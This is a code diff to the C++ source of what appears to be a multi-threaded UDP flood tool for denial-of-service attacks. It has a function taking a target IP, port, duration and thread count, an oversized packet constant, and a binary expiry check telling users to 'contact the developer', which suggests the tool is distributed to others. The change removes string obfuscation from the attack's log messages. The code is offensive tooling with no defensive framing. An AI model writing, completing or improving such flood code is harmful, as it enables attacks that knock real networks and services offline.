@@ -12,7 +12,7 @@
 #include <mutex>
 
 // Include the obfuscation library
-#include "obfuscate.h"
+//#include "obfuscate.h"
 
 #define PACKET_SIZE 9999999
 #define PAYLOAD_SIZE 1400
@@ -88,7 +88,7 @@ void multi_threaded_udp_attack(const char *ip, int port, int attack_time, int th
     std::vector<std::thread> threads;
 
     // Using obfuscated string for the log message
-    const char* start_message = OBFUSCATE("LAUNCHING MULTI-THREADED UDP FLOOD ATTACK");
+    const char* start_message = "LAUNCHING MULTI-THREADED UDP FLOOD ATTACK";
     std::cout << start_message << " with " << thread_count << " threads..." << std::endl;
 
     for (int i = 0; i < thread_count; ++i) {
@@ -101,7 +101,7 @@ void multi_threaded_udp_attack(const char *ip, int port, int attack_time, int th
         }
     }
 
-    const char* end_message = OBFUSCATE("MULTI-THREADED ATTACK COMPLETED.");
+    const char* end_message = "MULTI-THREADED ATTACK COMPLETED.";
     std::cout << end_message << std::endl;
 }
 
@@ -125,7 +125,7 @@ int main(int argc, char *argv[]) {
     int thread_count = get_thread_count(argc, argv);  // Determine thread count
 
     if (is_binary_expired()) {
-        const char* expiry_message = OBFUSCATE("ERROR: THIS BINARY HAS EXPIRED. PLEASE CONTACT THE DEVELOPER.");
+        const char* expiry_message = "ERROR: THIS BINARY HAS EXPIRED. PLEASE CONTACT THE DEVELOPER.";
         std::cerr << expiry_message << std::endl;
         return EXIT_FAILURE;
     }
